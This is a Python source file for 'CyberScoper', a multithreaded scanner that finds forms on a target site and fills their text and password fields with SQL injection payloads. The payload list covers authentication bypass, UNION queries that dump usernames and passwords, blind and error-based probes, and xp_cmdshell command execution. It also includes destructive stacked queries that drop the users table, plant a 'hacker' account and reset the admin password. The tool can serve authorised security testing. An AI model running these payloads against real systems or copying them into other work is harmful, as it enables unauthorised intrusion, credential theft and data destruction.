import sys
import threading
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import queue
import re
import difflib
import time
import random
import os
from datetime import datetime

# Styling imports
from colorama import init, Fore, Style
from termcolor import colored
import pyfiglet

# Ensure color support
init(autoreset=True)

# Styling constants
class HackerStyle:
    # Refined color palette
    NEON_GREEN = '\033[92m'
    NEON_BLUE = '\033[94m'
    NEON_PURPLE = '\033[95m'
    BRIGHT_WHITE = '\033[97m'
    RESET = '\033[0m'

    # Consistent styling
    @staticmethod
    def header(text):
        """Create a clean, highlighted header"""
        return f"{HackerStyle.NEON_BLUE}[*] {text}{HackerStyle.RESET}"

    @staticmethod
    def success(text):
        """Success message styling"""
        return f"{HackerStyle.NEON_GREEN}[+] {text}{HackerStyle.RESET}"

    @staticmethod
    def error(text):
        """Error message styling"""
        return f"\033[91m[!] {text}{HackerStyle.RESET}"

    @staticmethod
    def highlight(text, color=NEON_PURPLE):
        """Highlight text with a neon color"""
        return f"{color}{text}{HackerStyle.RESET}"

def create_ascii_banner():
    """Generate a clean, cyberpunk-style ASCII banner"""
    banner = pyfiglet.figlet_format("CyberScoper", font='slant')
    
    # Apply a subtle color gradient
    colored_banner = ""
    colors = [HackerStyle.NEON_GREEN, HackerStyle.NEON_BLUE, HackerStyle.NEON_PURPLE]
    for i, line in enumerate(banner.split('\n')):
        if line.strip():  # Only color non-empty lines
            color = colors[i % len(colors)]
            colored_banner += f"{color}{line}{HackerStyle.RESET}\n"
        else:
            colored_banner += line + '\n'
    
    return colored_banner

def progress_animation(total_steps=10):
    """Create a more sophisticated progress animation"""
    for i in range(total_steps):
        # Progressive loading bar with changing colors
        progress = "#" * (i + 1)
        empty = "." * (total_steps - i - 1)
        color = HackerStyle.NEON_GREEN if i < total_steps // 2 else HackerStyle.NEON_BLUE
        
        # Clear previous line and print new progress
        sys.stdout.write(f"\r{color}Scanning: [{progress}{empty}] {(i+1)*10}%{HackerStyle.RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    
    # Final newline
    print()

class CyberScoper:
    def __init__(self, target):
        # Startup sequence with refined styling
        self._startup_sequence()
        
        # Core initialization
        self.target = target
        self.payloads = []
        self.form_data = []
        self.queue = queue.Queue()
        self.results = []
        self.session = requests.Session()
        self.original_responses = {}
        self.scan_start_time = time.time()
        self.scan_end_time = None

        # Load payloads and print banner
        self.load_payloads()
        self._print_banner()
        self.fetch_original_responses()

    def _startup_sequence(self):
        """Refined startup sequence with cleaner animations"""
        print(HackerStyle.header("Initializing CyberScoper Protocol"))
        time.sleep(0.5)
        progress_animation()
        print(HackerStyle.success("System Handshake Complete"))
        time.sleep(0.3)

    def _print_banner(self):
        """Enhanced, cleaner banner presentation"""
        # Print ASCII banner
        print(create_ascii_banner())
        
        # Target information with refined styling
        print(HackerStyle.header(f"Target: {HackerStyle.highlight(self.target, HackerStyle.BRIGHT_WHITE)}"))
        print(HackerStyle.header("Scanning for SQL Injection Vulnerabilities"))
        print("-" * 50)

    def generate_report(self):
        """Generate a comprehensive, stylized text report"""
        # Ensure results directory exists
        os.makedirs('cyberscoper_reports', exist_ok=True)
        
        # Generate filename with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f'cyberscoper_reports/vulnerability_report_{timestamp}.txt'
        
        # Calculate scan duration
        self.scan_end_time = time.time()
        scan_duration = self.scan_end_time - self.scan_start_time

        # Create report content
        report_content = [
            "=" * 70,
            f"{'CYBERSCOPER VULNERABILITY REPORT':^70}",
            "=" * 70,
            f"\nScan Target: {self.target}",
            f"Scan Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"Scan Duration: {scan_duration:.2f} seconds",
            "\n" + "=" * 70,
            "VULNERABILITY DETAILS",
            "=" * 70
        ]

        if self.results:
            report_content.append(f"\nVulnerabilities Discovered: {len(self.results)}")
            report_content.append("-" * 70)
            
            for i, (payload, action) in enumerate(self.results, 1):
                report_content.extend([
                    f"Vulnerability #{i}:",
                    f"  Payload: {payload}",
                    f"  Endpoint: {action}",
                    "-" * 70
                ])
        else:
            report_content.append("\nNo Vulnerabilities Detected")

        report_content.extend([
            "\n" + "=" * 70,
            f"{'END OF REPORT':^70}",
            "=" * 70
        ])

        # Write report to file
        with open(filename, 'w') as f:
            f.write('\n'.join(report_content))

        # Return filename for reference
        return filename

    def load_payloads(self):
        """
        Load an extensive collection of SQL injection payloads
        Covers multiple attack vectors, database types, and injection techniques
        """
        # Classic SQL Injection Payloads
        classic_injections = [
            # Basic Boolean-based Injections
            "' OR 1=1 --", 
            "' OR '1'='1", 
            "\" OR \"1\"=\"1", 
            "admin' --", 
            "1' OR '1'='1",
            "1 OR 1=1",
            "1' AND 1=1 --",
            
            # Variants with spaces and comments
            "' OR 1=1 #",
            "' OR 1=1 /*",
            "1' OR '1'='1 --+",
            
            # Authentication Bypass
            "admin' --",
            "admin' #",
            "admin' /*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
        ]
        
        # UNION-based Injections
        union_injections = [
            "' UNION SELECT NULL--", 
            "' UNION SELECT NULL,NULL--", 
            "' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT 1,2,3--",
            "1' UNION SELECT database(),user(),version()--",
            "1' UNION ALL SELECT NULL,NULL,CONCAT(username,0x3a,password)FROM users--",
            
            # More advanced UNION techniques
            "1' UNION SELECT 1,2,3,4,5,6,7--",
            "' UNION SELECT NULL,CONCAT(username,0x3a,password)FROM users--",
            "1' UNION SELECT username,password FROM users--",
        ]
        
        # Stacked Queries (Multiple Query Injection)
        stacked_queries = [
            "; DROP TABLE users--",
            "'; DROP TABLE users--",
            "1'; INSERT INTO users (username, password) VALUES ('hacker', 'pwned')--",
            "; UPDATE users SET password='hacked' WHERE username='admin'--",
            "1'; CREATE USER 'hacker'@'localhost' IDENTIFIED BY 'password'--",
        ]
        
        # Blind SQL Injection Payloads
        blind_injections = [
            # Boolean-based Blind SQL
            "1' AND 1=1--+",
            "1' AND substring(database(),1,1)='a'--+",
            "1' AND ascii(substring(database(),1,1))=97--+",
            
            # Time-based Blind SQL
            "1' AND IF(1=1, SLEEP(5), 0)--+",
            "1' OR IF(substring(database(),1,1)='a', SLEEP(5), 0)--+",
            "1' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--",
        ]
        
        # Out-of-band Techniques
        out_of_band_injections = [
            "1' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'\\\\test.txt')))--+",
            "1' AND 1=CONVERT(INT, @@version)--",
            "1' AND (SELECT CASE WHEN (username='admin') THEN 1/0 ELSE 1 END FROM users)--",
        ]
        
        # Error-based Injections
        error_based_injections = [
            "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(CONCAT(0x3a,(IFNULL(CAST(database() AS CHAR),0x20))),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)--+",
            "1' OR 1=CONVERT(INT, @@version)--",
            "1' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END FROM users)--",
        ]
        
        # Encoded/Obfuscated Payloads
        encoded_injections = [
            "&#39; OR 1=1 --",
            "%27%20OR%201%3D1--",
            "' UNION SELECT NULL,NULL,CONCAT(username,0x3a,password) FROM users--",
            "1' AND 0x31 = 0x31--",
            "1' AND HEX('a') = 0x61--",
        ]
        
        # Database-Specific Injections
        # MySQL Specific
        mysql_injections = [
            "1' AND (SELECT 1 FROM mysql.user LIMIT 1)=1--+",
            "1' AND (SELECT IF(COUNT(*)=1,BENCHMARK(5000000,MD5('a')),0) FROM users)--+",
        ]
        
        # PostgreSQL Specific
        postgresql_injections = [
            "1' AND pg_sleep(5)--",
            "1' AND (SELECT CASE WHEN (username='admin') THEN 1 ELSE 0 END FROM users)--",
        ]
        
        # Oracle Specific
        oracle_injections = [
            "1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END FROM dual)--",
            "1' OR '1'=(SELECT DECODE(NVL(USER,'SYS'),'SYS') FROM dual)--",
        ]
        
        # Microsoft SQL Server Specific
        mssql_injections = [
            "1' AND CAST(@@version AS INT)=1--",
            "1' AND EXISTS(SELECT * FROM master.dbo.sysdatabases)--",
        ]
        
        # SQLite Specific
        sqlite_injections = [
            "1' AND sqlite_version() = '3.25.2'--",
            "1' AND (SELECT length(sqlite_master))--",
        ]
        
        # Advanced Technique Payloads
        advanced_injections = [
            "1' AND (SELECT 1 FROM users LIMIT 1)=1--+",
            "1' AND (SELECT IF(ASCII(SUBSTRING(database(),1,1))=97,BENCHMARK(5000000,MD5('a')),0))--+",
        ]
        
        # Potential Lateral Movement Payloads
        lateral_movement_injections = [
            "1'; EXEC xp_cmdshell('ipconfig')--",
            "1' AND 1=EXEC('SELECT @@version')--",
        ]
        
        # Compilation of all payloads
        comprehensive_payloads = (
            classic_injections +
            union_injections +
            stacked_queries +
            blind_injections +
            out_of_band_injections +
            error_based_injections +
            encoded_injections +
            mysql_injections +
            postgresql_injections +
            oracle_injections +
            mssql_injections +
            sqlite_injections +
            advanced_injections +
            lateral_movement_injections
        )
        
        # Shuffle payloads to randomize testing order
        import random
        random.shuffle(comprehensive_payloads)
        
        # Add comprehensive payloads to the main payload list
        self.payloads.extend(comprehensive_payloads)
        
        # Remove potential duplicates while preserving order
        self.payloads = list(dict.fromkeys(self.payloads))
        
        # Optional: Truncate payload list to prevent extremely long scans
        # Adjust the number based on desired scan thoroughness
        max_payloads = 250  # Adjust as needed
        self.payloads = self.payloads[:max_payloads]

    def fetch_original_responses(self):
        """Fetch original responses for different forms"""
        try:
            # Fetch original responses for different pages
            forms = self.fetch_forms()
            for form in forms:
                details = self.get_form_details(form)
                url = details['action']
                if url not in self.original_responses:
                    try:
                        response = self.session.get(url, timeout=10)
                        self.original_responses[url] = response
                    except Exception as e:
                        print(HackerStyle.error(f"Error fetching original response for {url}: {e}"))
        except Exception as e:
            print(HackerStyle.error(f"Error in fetch_original_responses: {e}"))

    def fetch_forms(self):
        """Fetch forms from the target URL"""
        try:
            res = self.session.get(self.target, timeout=10)
            soup = BeautifulSoup(res.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(HackerStyle.error(f"Error fetching forms: {e}"))
            return []

    def get_form_details(self, form):
        """Extract details from a form"""
        details = {}
        action = form.attrs.get("action", "")
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            name = input_tag.attrs.get("name")
            input_type = input_tag.attrs.get("type", "text")
            value = input_tag.attrs.get("value", "")
            inputs.append({"type": input_type, "name": name, "value": value})
        details["action"] = urljoin(self.target, action)
        details["method"] = method
        details["inputs"] = inputs
        return details

    def submit_form(self, form_details, payload):
        """Submit a form with a specific payload"""
        data = {}
        for input in form_details["inputs"]:
            if input["type"] == "text" or input["type"] == "search" or input["type"] == "password":
                data[input["name"]] = payload
            else:
                data[input["name"]] = input["value"]
        try:
            if form_details["method"] == "post":
                return self.session.post(form_details["action"], data=data, timeout=10)
            else:
                return self.session.get(form_details["action"], params=data, timeout=10)
        except requests.exceptions.RequestException:
            return None

    def worker(self):
        """Worker method for processing payloads"""
        while not self.queue.empty():
            form_details, payload = self.queue.get()
            try:
                # Get original response for this specific form/page
                original_response = self.original_responses.get(form_details['action'])
                
                # If no original response, skip
                if not original_response:
                    self.queue.task_done()
                    continue
                
                # Submit form with injection payload
                injection_response = self.submit_form(form_details, payload)
                
                # Detect if injection was successful
                if self.detect_successful_injection(original_response, injection_response, payload):
                    msg = f"[!] Potential Vulnerability: {payload} -> {form_details['action']}"
                    print(msg)
                    self.results.append((payload, form_details["action"]))
                else:
                    print(f"[x] Tried: {payload} at {form_details['action']}")
            except Exception as e:
                print(HackerStyle.error(f"Error processing payload: {e}"))
            finally:
                self.queue.task_done()

    def detect_successful_injection(self, original_response, injection_response, payload):
        """Detect successful SQL injection"""
        if not original_response or not injection_response:
            return False

        # Convert to lowercase for case-insensitive comparison
        orig_text = original_response.text.lower()
        inj_text = injection_response.text.lower()

        # Strict error indicators
        error_indicators = [
            r'syntax\s*error',
            r'mysql\s*error',
            r'invalid\s*syntax',
            r'you have an error',
            r'sql\s*syntax'
        ]

        # Stringent success indicators
        success_indicators = [
            # Definitive signs of successful injection
            r'logged\s*in\s*successfully',
            r'welcome\s*admin',
            r'access\s*granted',
            r'admin\s*dashboard',
            
            # Specific to this site
            r'userinfo\.php\s*with\s*content',
            r'retrieved\s*user\s*details'
        ]

        # Check for error indicators
        error_matches = [
            pattern for pattern in error_indicators 
            if re.search(pattern, inj_text, re.IGNORECASE)
        ]

        # Check for success indicators
        success_matches = [
            pattern for pattern in success_indicators 
            if re.search(pattern, inj_text, re.IGNORECASE)
        ]

        # Compare response characteristics
        content_change_significant = len(inj_text) != len(orig_text)
        
        # Title change might indicate successful injection
        orig_title = re.search(r'<title>(.*?)</title>', orig_text)
        inj_title = re.search(r'<title>(.*?)</title>', inj_text)
        title_changed = (
            orig_title and inj_title and 
            orig_title.group(1).lower() != inj_title.group(1).lower()
        )

        # Very strict vulnerability detection
        is_vulnerable = (
            # Require NO error indicators
            len(error_matches) == 0 and (
                # Either significant success indicators
                (len(success_matches) > 0) or 
                # Or significant content/title change
                (content_change_significant and title_changed)
            )
        )
        
        return is_vulnerable

    def run(self):
        """Refined scanning process with improved styling"""
        print(HackerStyle.header("Initiating Deep Scan Protocol"))
        
        # Fetch forms
        forms = self.fetch_forms()
        if not forms:
            print(HackerStyle.error("No Entry Points Detected"))
            return

        # Prepare payloads
        for form in forms:
            details = self.get_form_details(form)
            for payload in self.payloads:
                self.queue.put((details, payload))

        # Threaded scanning with progress indication
        threads = []
        for _ in range(min(10, self.queue.qsize())):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        # Final report with refined styling
        print("\n" + "=" * 50)
        print(HackerStyle.header("Infiltration Report"))
        
        if self.results:
            print(HackerStyle.success(f"{len(self.results)} Vulnerabilities Discovered:"))
            for payload, action in self.results:
                print(f"  {HackerStyle.highlight('Payload:')} {payload}")
                print(f"  {HackerStyle.highlight('Endpoint:')} {action}\n")
        else:
            print(HackerStyle.error("No Vulnerabilities Detected"))

        print("=" * 50)

        # Generate and print report location
        report_file = self.generate_report()
        print(f"\n{HackerStyle.success(f'Detailed Report Generated: {report_file}')}")

if __name__ == "__main__":
    if len(sys.argv) != 3 or sys.argv[1] != "scope":
        print(HackerStyle.error("Usage: python cyberscope.py scope http://example.com"))
        sys.exit(1)

    target_url = sys.argv[2]
    scanner = CyberScoper(target_url)
    scanner.run()